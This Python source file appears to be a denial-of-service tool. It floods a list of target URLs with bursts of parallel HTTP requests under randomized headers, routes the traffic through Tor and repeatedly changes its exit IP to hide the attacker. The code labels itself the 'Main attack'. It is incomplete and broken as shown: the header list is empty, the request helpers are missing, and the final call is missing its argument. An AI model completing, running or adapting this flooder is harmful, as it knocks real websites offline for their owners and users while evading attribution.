import asyncio
import json
import os
import random
import threading
import time
import traceback
from threading import Thread
from typing import Dict, Any, List, Tuple
import aiohttp.client_exceptions
import requests
import concurrent.futures
from itertools import repeat
from aiohttp import ClientSession
from tekleo_common_utils import UtilsRandom
from stem import Signal
from stem.control import Controller


# Important global variables
#-----------------------------------------------------------------------------------------------------------------------
utils_random = UtilsRandom()



TOR_CHANGE_IP_LOCK = threading.Lock()
#-----------------------------------------------------------------------------------------------------------------------



# Configuration
#-----------------------------------------------------------------------------------------------------------------------
# Load configuration
NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])
ENABLE_TOR = bool(int(os.environ['ENABLE_TOR']))
TOR_IP_CHANGE_FREQUENCY = int(os.environ['TOR_IP_CHANGE_FREQUENCY'])
TOR_IP_CHANGE_ALLOWED = TOR_IP_CHANGE_FREQUENCY > 0

# Load targets
LIST_OF_URLS = []
with open('../targets.txt') as f:
    lines = f.readlines()
    lines = [l.strip() for l in lines]
    lines = [l for l in lines if len(l) > 0]
    LIST_OF_URLS.extend(lines)

# Load randomized headers
LIST_OF_HEADERS =
#-----------------------------------------------------------------------------------------------------------------------



# HTTP calls
#-----------------------------------------------------------------------------------------------------------------------



#-----------------------------------------------------------------------------------------------------------------------



# TOR helpers
#-----------------------------------------------------------------------------------------------------------------------
def change_ip_tor():
    with TOR_CHANGE_IP_LOCK:
        time.sleep(1)
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='my password')
            controller.signal(Signal.NEWNYM)
        print("switch_tor_ip(): Generated new IP")
        time.sleep(1)

async def check_my_ip_with_tor(session: ClientSession) -> (int, Dict[str, Any], bytes):
    result = await http_get_with_aiohttp(session, 'https://api.myip.com/', proxy="http://127.0.0.1:8118")
    print("check_my_ip_with_tor(): Your current TOR IP address: " + str(result))
    return result

async def check_my_ip_without_tor(session: ClientSession) -> (int, Dict[str, Any], bytes):
    result = await http_get_with_aiohttp(session, 'https://api.myip.com/')
    print("check_my_ip_without_tor(): Your current IP address: " + str(result))
    return result
#-----------------------------------------------------------------------------------------------------------------------



# Main attack
#-----------------------------------------------------------------------------------------------------------------------
async def epoch(epoch_number: int):
    print('\n\n------- Attack Epoch #' + str(epoch_number) + ' -------')

    # Open session
    session = ClientSession()

    # Randomize links
    random.shuffle(LIST_OF_HEADERS)

    # For each target
    for i in range(0, len(LIST_OF_URLS)):
        # Get URL
        target_url = LIST_OF_URLS[i]

        # If needed - change IP
        if ENABLE_TOR and TOR_IP_CHANGE_ALLOWED:
            if i % TOR_IP_CHANGE_FREQUENCY == 0:
                change_ip_tor()
                await check_my_ip_with_tor(session)

        # Gen headers and proxy
        headers = random.choice(LIST_OF_HEADERS)
        proxy = None
        if ENABLE_TOR:
            proxy = "http://127.0.0.1:8118"
        else:
            print('epoch(): WARNING!!!! TOR is disabled!!!!')
            await check_my_ip_without_tor(session)

        # Determine how many requests we need to make
        number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)

        # Generate URLs
        current_target_urls = [target_url for i in range(0, number_of_requests)]

        # Run requests
        results, t = await http_get_with_aiohttp_parallel(session, current_target_urls, headers=headers, proxy=proxy, ignore_json=True, ignore_body=True)
        debug_stats(target_url, results, t)

    # Close session
    await session.close()


async def main():
    for i in range(0, NUMBER_OF_EPOCHS):
        await epoch(i)


asyncio.run(check_my_ip_with_tor())
#-----------------------------------------------------------------------------------------------------------------------